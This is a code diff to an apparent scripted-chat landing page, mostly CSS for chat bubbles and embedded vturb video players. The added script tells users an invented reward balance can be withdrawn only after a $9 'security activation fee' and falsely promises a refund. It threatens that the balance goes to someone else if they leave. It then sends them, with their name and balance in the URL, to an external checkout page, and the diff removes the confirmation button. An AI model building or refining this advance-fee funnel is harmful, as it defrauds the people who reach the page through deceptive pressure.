@@ -317,9 +317,20 @@
       padding: 0;
       overflow: hidden;
       width: 100%;
+      max-width: 88%;
+      background: #ffffff;
+      border: 1px solid rgba(18, 18, 18, .08);
+      border-radius: 18px 18px 18px 5px;
+      box-shadow: 0 3px 12px rgba(18, 18, 18, .08);
+    }
+
+    .bubble.media.vsl-media {
+      background: transparent;
+      border: none;
+      box-shadow: none;
       max-width: 100%;
-      background: #000;
-      border-color: rgba(0, 0, 0, .15);
+      width: auto;
+      padding: 0;
     }
 
     .bubble.media iframe,
@@ -333,12 +344,34 @@
     .bubble.media .vsl-wrap {
       width: 100%;
       max-width: 100%;
-      background: #000;
+      background: transparent;
       overflow: hidden;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      border: none;
+    }
+
+    .bubble.media .vsl-wrap.vsl-1 {
+      width: 100%;
+      max-width: 320px;
+      border-radius: 16px;
+    }
+
+    .bubble.media .vsl-wrap.vsl-2 {
+      width: 100%;
+      max-width: 100%;
+      border-radius: 16px;
     }
 
     .bubble.media .vsl-wrap vturb-smartplayer {
-      margin: 0 auto;
+      margin: 0;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .bubble.media .vsl-wrap .vturb-player-placeholder {
+      border-radius: 16px;
+      background: #111111 !important;
     }
 
     .bubble.media iframe.withdraw-receipt {
@@ -730,8 +763,8 @@
       function renderVsl1() {
         var wrap = document.createElement('div');
         wrap.className = 'vsl-wrap vsl-1';
-        wrap.innerHTML = '<vturb-smartplayer id="vid-6acd1cb1f9829c9f82e3b7ca" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>';
-        botRow(wrap, 'media');
+        wrap.innerHTML = '<vturb-smartplayer id="vid-6acd1cb1f9829c9f82e3b7ca" style="display: block; margin: 0 auto; width: 100%; max-width: 320px; border-radius: 16px; overflow: hidden;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0; z-index: 0; background-color: #111111; border-radius: 16px;"></div></vturb-smartplayer>';
+        botRow(wrap, 'media vsl-media');
 
         var s = document.createElement('script');
         s.type = 'text/javascript';
@@ -750,8 +783,8 @@
       function renderVsl2() {
         var wrap = document.createElement('div');
         wrap.className = 'vsl-wrap vsl-2';
-        wrap.innerHTML = '<vturb-smartplayer id="vid-6acd1cd56cde7bc69e6b35fb" style="display: block; margin: 0 auto; width: 100%;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 56.25% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>';
-        botRow(wrap, 'media');
+        wrap.innerHTML = '<vturb-smartplayer id="vid-6acd1cd56cde7bc69e6b35fb" style="display: block; margin: 0 auto; width: 100%; border-radius: 16px; overflow: hidden;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 56.25% 0 0; z-index: 0; background-color: #111111; border-radius: 16px;"></div></vturb-smartplayer>';
+        botRow(wrap, 'media vsl-media');
 
         var s = document.createElement('script');
         s.type = 'text/javascript';
@@ -854,6 +887,21 @@
           renderVsl2();
           await sleep(4000);
           await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
+          await sleep(2500);
+          await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
+          await sleep(2000);
+          await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
+          await sleep(2000);
+          var testParams = new URLSearchParams(window.location.search || '');
+          if (vars.nome && !testParams.get('name')) testParams.set('name', vars.nome);
+          var testFinalBal = (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2);
+          if (!testParams.get('balance')) testParams.set('balance', testFinalBal);
+          var testQs = testParams.toString();
+          var testCheckoutUrl = 'https://checkout.melodyrewards.com/' + (testQs ? '?' + testQs : '');
+          if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+            testCheckoutUrl = '/checkout' + (testQs ? '?' + testQs : '');
+          }
+          window.location.href = testCheckoutUrl;
           return;
         }
 
@@ -941,8 +989,7 @@
         await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
         await sleep(2000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
-        await sleep(1500);
-        await askButton('Unlock Withdrawal of ${{balance}}');
+        await sleep(2000);
         var params = new URLSearchParams(window.location.search || '');
         if (vars.nome && !params.get('name')) params.set('name', vars.nome);
         var finalBal = (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2);
